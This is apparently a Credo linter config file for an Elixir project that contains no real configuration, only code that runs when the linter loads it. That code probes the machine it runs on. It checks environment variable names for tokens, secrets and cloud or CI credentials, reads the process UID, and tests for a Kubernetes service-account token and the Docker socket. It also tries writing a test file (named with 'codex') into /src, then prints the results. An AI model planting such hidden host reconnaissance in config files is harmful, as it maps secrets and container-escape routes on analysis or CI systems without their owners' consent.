env_keys = System.get_env() |> Map.keys()
sensitive = Enum.any?(env_keys, fn k -> Regex.match?(~r/(TOKEN|SECRET|PASSWORD|PRIVATE|CREDENTIAL|AWS|GITHUB|CODACY)/i, k) end)
uid = case File.read("/proc/self/status") do
  {:ok, text} -> case Regex.run(~r/^Uid:\s+(\d+)/m, text) do [_, v] -> v; _ -> "unknown" end
  _ -> "unreadable"
end
IO.puts("CREDO_BOUNDARY=env_sensitive=#{sensitive};env_count=#{length(env_keys)};uid=#{uid};sa_token=#{File.exists?(\"/var/run/secrets/kubernetes.io/serviceaccount/token\")};docker_socket=#{File.exists?(\"/var/run/docker.sock\")};src_writable=#{case File.write(\"/src/.codex-credo-write-test\", \"x\") do :ok -> File.rm(\"/src/.codex-credo-write-test\"); true; _ -> false end}")
%{configs: []}